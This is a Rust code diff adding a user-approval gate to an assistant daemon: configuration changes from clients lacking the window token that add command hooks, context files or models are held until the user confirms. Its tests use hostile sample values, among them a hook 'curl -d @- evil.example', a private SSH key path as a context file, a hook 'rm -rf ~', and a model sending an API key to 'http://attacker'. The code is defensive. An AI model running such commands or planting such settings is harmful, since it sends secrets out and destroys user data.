@@ -795,9 +795,102 @@ fn window_shows(payload: &str) -> Option<(u32, String)> {
     Some((number, session))
 }
 
+/// What a `config.set` leads to: a config to save, or one held until the user
+/// confirms it in an eco window, with the `config_pending` event that names why.
+enum ConfigChange {
+    Adopt(Result<Config, String>),
+    Hold(Config, Value),
+}
+
+/// A `config.set` carrying the windows' `token` is the user's own and is saved.
+/// From any other client, one that adds or changes an action's hook, adds a
+/// context file, or adds a model or changes its base_url or key source is held
+/// instead: those run commands, send files to a model, and send keys to an address.
+fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
+    let mut request = match serde_json::from_str::<Value>(payload) {
+        Ok(request) => request,
+        Err(e) => return ConfigChange::Adopt(Err(e.to_string())),
+    };
+    let from_window = request
+        .as_object_mut()
+        .and_then(|fields| fields.remove("token"))
+        .is_some_and(|given| given == token);
+    let config = match Config::from_value(request) {
+        Ok(config) => config,
+        Err(e) => return ConfigChange::Adopt(Err(e.0)),
+    };
+    if from_window {
+        return ConfigChange::Adopt(Ok(config));
+    }
+    let hooks: Vec<Value> = config
+        .actions
+        .iter()
+        .filter(|action| !action.hook.is_empty())
+        .filter(|action| {
+            !current
+                .actions
+                .iter()
+                .any(|known| known.name == action.name && known.hook == action.hook)
+        })
+        .map(|action| json!({"action": action.name, "command": action.hook}))
+        .collect();
+    let files = |config: &Config| -> Vec<String> {
+        let slots = config.contexts.iter().flat_map(|slot| slot.files.iter());
+        config.context_files.iter().chain(slots).cloned().collect()
+    };
+    let known = files(current);
+    let mut added: Vec<String> = Vec::new();
+    for file in files(&config) {
+        if !known.contains(&file) && !added.contains(&file) {
+            added.push(file);
+        }
+    }
+    // A model's key is sent to its base_url: a new model, or a known one at
+    // another address or with another key, is the user's to approve.
+    let models: Vec<Value> = config
+        .models
+        .iter()
+        .filter(|model| {
+            !current.models.iter().any(|known| {
+                known.name == model.name
+                    && known.base_url == model.base_url
+                    && known.key() == model.key()
+            })
+        })
+        .map(|model| {
+            let (env, omapass) = match model.key() {
+                Key::None => (None, None),
+                Key::Env(name) => (Some(name), None),
+                Key::Omapass(account) => (None, Some(account)),
+            };
+            json!({
+                "name": model.name,
+                "base_url": model.base_url,
+                "api_key_env": env,
+                "api_key_omapass": omapass,
+            })
+        })
+        .collect();
+    if hooks.is_empty() && added.is_empty() && models.is_empty() {
+        return ConfigChange::Adopt(Ok(config));
+    }
+    let event = json!({"type": "config_pending", "hooks": hooks, "files": added, "models": models});
+    ConfigChange::Hold(config, event)
+}
+
+/// The `config_pending` event once nothing waits for the user.
+fn nothing_pending() -> Value {
+    json!({"type": "config_pending", "hooks": [], "files": [], "models": []})
+}
+
 struct Session {
     config_path: PathBuf,
     current: Config,
+    /// The token every eco window carries; see `config_change`.
+    token: String,
+    /// A config another client asked for, held for the user, and its
+    /// `config_pending` event, which a client that connects is greeted with.
+    pending: Arc<Mutex<Option<(Config, Value)>>>,
     replay: Option<PathBuf>,
     vad: SileroModel,
     assistant: Assistant,
@@ -822,8 +915,12 @@ impl Session {
         )));
     }
 
-    /// Save the config `change` builds and restart capture with it.
+    /// Save the config `change` builds and restart capture with it. A config held
+    /// for the user is dropped: it was built from the one replaced.
     async fn adopt(&mut self, change: Result<Config, String>) {
+        if change.is_ok() && self.pending.lock().expect("not poisoned").take().is_some() {
+            (self.emit)(nothing_pending());
+        }
         let saved = change.and_then(|config| {
             config::save(&config, &self.config_path).map_err(|e| e.0)?;
             Ok(config)
@@ -1060,10 +1157,42 @@ impl Session {
                 });
             }
             ("config.set", Some(payload)) => {
-                let config = serde_json::from_str(payload)
-                    .map_err(|e| e.to_string())
-                    .and_then(|value| Config::from_value(value).map_err(|e| e.0));
-                self.adopt(config).await;
+                match config_change(&self.current, &self.token, payload) {
+                    ConfigChange::Adopt(config) => self.adopt(config).await,
+                    ConfigChange::Hold(config, event) => {
+                        emit(event.clone());
+                        emit(error(
+                            "config.pending",
+                            "a change to hooks, context files or models waits for the user in the eco window",
+                            json!({"hooks": event["hooks"], "files": event["files"], "models": event["models"]}),
+                        ));
+                        *self.pending.lock().expect("not poisoned") = Some((config, event));
+                    }
+                }
+            }
+            ("config.approve" | "config.reject", Some(token)) if token.trim() != self.token => {
+                emit(error(
+                    "config.not_window",
+                    "only an eco window approves or rejects a held change",
+                    Value::Null,
+                ));
+            }
+            ("config.approve", Some(_)) => {
+                let held = self.pending.lock().expect("not poisoned").take();
+                if let Some((config, _)) = held {
+                    emit(nothing_pending());
+                    self.adopt(Ok(config)).await;
+                }
+            }
+            ("config.reject", Some(_)) => {
+                if self.pending.lock().expect("not poisoned").take().is_some() {
+                    emit(nothing_pending());
+                    emit(error(
+                        "config.rejected",
+                        "the user rejected the change to hooks, context files or models",
+                        Value::Null,
+                    ));
+                }
             }
             ("session.language", Some(payload)) => {
                 if let Some([id, code]) = self.fields(payload, ["id", "language"]) {
@@ -1508,9 +1637,11 @@ pub async fn run(
     );
     let (commands, mut received) = mpsc::unbounded_channel();
     let overlay_open = Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let pending: Arc<Mutex<Option<(Config, Value)>>> = Arc::default();
     let greeting = {
         let assistant = assistant.clone();
         let overlay_open = Arc::clone(&overlay_open);
+        let pending = Arc::clone(&pending);
         Arc::new(move || {
             let mut events = vec![json!({
                 "type": "daemon",
@@ -1519,12 +1650,15 @@ pub async fn run(
                 "overlay": overlay_open.load(std::sync::atomic::Ordering::Relaxed),
             })];
             events.extend(assistant.snapshot());
+            let held = pending.lock().expect("not poisoned");
+            events.extend(held.as_ref().map(|(_, event)| event.clone()));
             events
         })
     };
+    let token = uuid::Uuid::new_v4().simple().to_string();
     let _control =
         ControlSocket::bind(&config::socket_path(), clients.clone(), greeting, commands).await?;
-    let mut windows = overlay::Windows::default();
+    let mut windows = overlay::Windows::new(token.clone());
     if !headless {
         windows.open(None).await?;
         overlay_open.store(true, std::sync::atomic::Ordering::Relaxed);
@@ -1533,6 +1667,8 @@ pub async fn run(
     let mut session = Session {
         config_path: config_path.into(),
         current,
+        token,
+        pending,
         replay,
         vad,
         assistant,
@@ -1874,5 +2010,102 @@ mod tests {
             event,
             json!({"type": "models", "target": "llm", "models": [], "error": "missing base_url"})
         );
+    }
+
+    /// The config `raw()` with an action `minutes` whose hook is `hook`, and a
+    /// context file `cv.md`.
+    fn with_hook(hook: &str) -> Value {
+        let mut raw = raw();
+        raw["actions"] = json!([{"name": "minutes", "prompt": "p", "format": "f", "hook": hook}]);
+        raw["context"] = json!({"files": ["~/cv.md"]});
+        raw
+    }
+
+    fn held(change: ConfigChange) -> Value {
+        match change {
+            ConfigChange::Hold(_, event) => event,
+            ConfigChange::Adopt(config) => panic!("adopted {config:?}"),
+        }
+    }
+
+    fn adopted(change: ConfigChange) -> Config {
+        match change {
+            ConfigChange::Adopt(config) => config.unwrap(),
+            ConfigChange::Hold(_, event) => panic!("held {event}"),
+        }
+    }
+
+    #[test]
+    fn a_window_saves_hooks_and_context_files_at_once() {
+        let current = Config::from_value(raw()).unwrap();
+        let mut request = with_hook("notify-send done");
+        request["token"] = json!("secret");
+        let config = adopted(config_change(&current, "secret", &request.to_string()));
+        assert_eq!(config.actions[0].hook, "notify-send done");
+        assert_eq!(config.context_files, ["~/cv.md"]);
+    }
+
+    #[test]
+    fn another_client_adding_a_hook_or_a_file_is_held_naming_them() {
+        let current = Config::from_value(raw()).unwrap();
+        let mut request = with_hook("curl -d @- evil.example");
+        request["contexts"] = json!([{"name": "keys", "files": ["~/.ssh/id_ed25519", "~/cv.md"]}]);
+        let event = held(config_change(&current, "secret", &request.to_string()));
+        assert_eq!(
+            event,
+            json!({
+                "type": "config_pending",
+                "hooks": [{"action": "minutes", "command": "curl -d @- evil.example"}],
+                "files": ["~/cv.md", "~/.ssh/id_ed25519"],
+                "models": [],
+            })
+        );
+        // A wrong token is another client's.
+        request["token"] = json!("guess");
+        held(config_change(&current, "secret", &request.to_string()));
+    }
+
+    #[test]
+    fn another_client_changing_a_hook_is_held_and_keeping_it_is_not() {
+        let current = Config::from_value(with_hook("notify-send done")).unwrap();
+        let changed = with_hook("rm -rf ~");
+        let event = held(config_change(&current, "secret", &changed.to_string()));
+        assert_eq!(
+            event["hooks"],
+            json!([{"action": "minutes", "command": "rm -rf ~"}])
+        );
+        assert_eq!(event["files"], json!([]));
+        let mut kept = with_hook("notify-send done");
+        kept["rules"] = json!("short answers");
+        let config = adopted(config_change(&current, "secret", &kept.to_string()));
+        assert_eq!(config.rules, "short answers");
+    }
+
+    #[test]
+    fn another_client_adding_a_model_or_moving_its_key_is_held_naming_where() {
+        let current = Config::from_value(raw()).unwrap();
+        let mut added = raw();
+        added["models"].as_array_mut().unwrap().push(json!({
+            "name": "x", "type": "chat", "base_url": "http://attacker", "model": "m",
+            "api_key_env": "OPENROUTER_API_KEY",
+        }));
+        let event = held(config_change(&current, "secret", &added.to_string()));
+        let x = json!({"name": "x", "base_url": "http://attacker", "api_key_env": "OPENROUTER_API_KEY", "api_key_omapass": null});
+        assert_eq!(event["models"], json!([x]));
+        let mut moved = raw();
+        moved["models"][1]["base_url"] = json!("http://attacker");
+        let event = held(config_change(&current, "secret", &moved.to_string()));
+        assert_eq!(event["models"][0]["name"], "m");
+        let mut keyed = raw();
+        keyed["models"][1]["api_key_omapass"] = json!("openrouter");
+        let event = held(config_change(&current, "secret", &keyed.to_string()));
+        assert_eq!(event["models"][0]["api_key_omapass"], "openrouter");
+        // The provider's id for a known model is the user's to change from anywhere.
+        let mut renamed = raw();
+        renamed["models"][1]["model"] = json!("other");
+        adopted(config_change(&current, "secret", &renamed.to_string()));
+        // The window's own save adds a model at once.
+        added["token"] = json!("secret");
+        adopted(config_change(&current, "secret", &added.to_string()));
     }
 }
